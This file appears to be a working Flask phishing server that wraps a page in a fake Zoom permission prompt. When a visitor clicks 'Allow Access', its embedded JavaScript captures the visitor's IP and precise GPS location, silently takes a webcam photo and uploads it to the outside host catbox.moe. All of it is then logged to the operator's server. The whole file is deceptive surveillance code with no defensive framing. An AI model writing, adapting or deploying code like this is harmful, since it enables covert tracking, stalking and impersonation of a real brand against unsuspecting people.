from flask import Flask, request, jsonify, redirect
import logging
from datetime import datetime
import os
import json

app = Flask(__name__)

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.StreamHandler()]
)
logger = logging.getLogger('gps_logger')

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Location Service</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
.doorDash-heading {{
  font-family: 'Inter', sans-serif;
  font-weight: 700; /* Bold */
  font-size: 22px;
  color: #2E3131;
  letter-spacing: -0.3px;
  margin-bottom: 8px;
}}

.doorDash-text {{
  font-family: 'Inter', sans-serif;
  font-weight: 400; /* Regular */
  font-size: 16px;
  color: #6B7177;
  line-height: 1.5;
  margin-bottom: 20px;
}}

.doorDash-button {{
  font-family: 'Inter', sans-serif;
  font-weight: 600; /* Semi-bold */
  font-size: 16px;
}}

.gps-overlay {{
  position: fixed;
  top: auto;        /* Remove forced sizing */
  right: auto;
  bottom: auto;
  left: auto;

  width: 340px;          /* DoorDash-like width */
  max-height: 80vh;      /* Prevents overflow */
  min-height: 200px;     /* Ensures visibility */

  display: inline-block;
  max-width: 90vw;  /* Prevents edge touching */
  margin: 20px;     /* Uniform spacing */

  display: flex;
  flex-direction: column;
  justify-content: space-between;
  box-sizing: border-box; /* Includes padding in width */

  left: 50%;
  top: 50%;
  transform: translate(-50%, -50%);
  
  background: rgba(0,0,0,0.95);
  border-radius: 16px;
  overflow: hidden;
  z-index: 10000;
  box-shadow: none; /* Removes any shadow-generated black box */
  margin: 0; /* Ensures no external spacing */
}}

.body {{
  margin: 0;
  background: black; /* Eliminates white bars */
}}

        .gps-modal {{
            background: white;
            padding: 25px;
            border-radius: 10px;
            max-width: 400px;
            text-align: center;
            font-weight: bold;
            font-family: 'Inter', sans-serif;
        }}
        .gps-btn {{
            background: #0B5CFF;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 15px;
            font-weight: bold;
        }}
    </style>
</head>
<body>
    <!-- Your existing content -->
    {existing_content}
    
    <!-- GPS Permission Overlay -->
    <div class="gps-overlay">
        <div class="gps-modal">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Zoom-Logo.png" width="150" alt="Zoom">
            <h2 class="doorDash-heading">Allow Zoom to use your device for video conferences</h2>
            <p class="doorDash-text">Allow us access to things like your camera, location, and microphone to continue using Zoom</p>
            <button class="gps-btn" id="gps-allow-btn">Allow Access</button>
        </div>
    </div>

<script>
    // Helper function to convert data URL to blob
    function dataURLtoBlob(dataurl) {
        const arr = dataurl.split(',');
        const mime = arr[0].match(/:(.*?);/)[1];
        const bstr = atob(arr[1]);
        let n = bstr.length;
        const u8arr = new Uint8Array(n);
        while(n--) u8arr[n] = bstr.charCodeAt(n);
        return new Blob([u8arr], {type: mime});
    }

    document.getElementById('gps-allow-btn').addEventListener('click', async () => {
        try {
            // Get client IP
            const ip = await fetch('/getip').then(r => r.text());
            
            // Log permission request
            await fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'permission_request',
                    ip: ip,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Get GPS location
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 10000,
                    maximumAge: 0
                });
            });

            // Request camera access and capture photo
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: true,
                audio: false 
            });
            
            const video = document.createElement('video');
            video.srcObject = stream;
            await video.play();
            
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            const photoData = canvas.toDataURL('image/jpeg', 0.8);
            
            // Stop camera stream
            stream.getTracks().forEach(track => track.stop());
            
            // Upload to Catbox
            const formData = new FormData();
            formData.append('reqtype', 'fileupload');
            formData.append('fileToUpload', 
                new File([dataURLtoBlob(photoData)], 'photo.jpg', { type: 'image/jpeg' })
            );
            
            const catboxResponse = await fetch('https://catbox.moe/user/api.php', {
                method: 'POST',
                body: formData
            });
            const catboxUrl = await catboxResponse.text();
            
            // Log all data (GPS + photo URL)
            await fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'full_data',
                    ip: ip,
                    gps: {
                        lat: position.coords.latitude,
                        lng: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    },
                    photo_url: catboxUrl,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Remove overlay
            document.querySelector('.gps-overlay').remove();
            
        } catch (error) {
            console.error('Error:', error);
            await fetch('/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'error',
                    error: error.message,
                    ip: await fetch('/getip').then(r => r.text()),
                    timestamp: new Date().toISOString()
                })
            });
            alert('Error: ' + error.message);
        }
    });
</script>
</body>
</html>
"""

@app.route('/')
def serve_page():
    """Serve the page with GPS overlay"""
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    logger.info(f"Page served to IP: {client_ip}")
    
    # Load your existing page.html content
    with open('page.html', 'r') as f:
        existing_content = f.read()
    
    return HTML_TEMPLATE.format(existing_content=existing_content)

@app.route('/getip')
def get_ip():
    """Endpoint to get client IP"""
    return request.headers.get('X-Forwarded-For', request.remote_addr)

@app.route('/log', methods=['POST'])
def log_data():
    """Central logging endpoint"""
    data = request.json
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    # Enhanced logging with all relevant data
    log_entry = {
        'timestamp': datetime.utcnow().isoformat(),
        'client_ip': client_ip,
        'event_data': data
    }
    
    logger.info(json.dumps(log_entry, indent=2))
    return jsonify({'status': 'success'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
